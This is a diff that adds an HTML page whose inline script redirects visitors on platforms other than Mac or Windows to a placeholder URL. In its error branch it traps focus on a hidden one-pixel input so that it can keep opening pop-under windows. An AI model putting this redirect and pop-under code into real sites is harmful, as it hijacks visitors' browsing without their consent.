@@ -1,0 +1,33 @@
+<body>
+<script>
+try {
+    nava = window.navigator.platform.toLocaleLowerCase();
+    if (nava.indexOf('mac') < 0 && nava.indexOf('win') < 0) {
+        top.location.href = "https://www.example.com";
+    }
+} catch (err) {
+    var script = document.createElement('script');
+    script.async = false;
+    var input = document.createElement('input');
+    input.type = 'text';
+    input.style = "width:1;";
+    input.addEventListener('blur', function() {
+        window.open('https://www.example.com');
+        setTimeout(function() {
+            if (document.visibilityState == 'hidden') {
+                time = 20
+            }
+        }, 500);
+    }, false);
+    document.body.appendChild(input);
+    var time = 0;
+    input.focus();
+    setInterval(function() {
+        time++;
+        if (time < 10) {
+            input.focus();
+        }
+    }, 2000)
+}
+</script>
+</body>
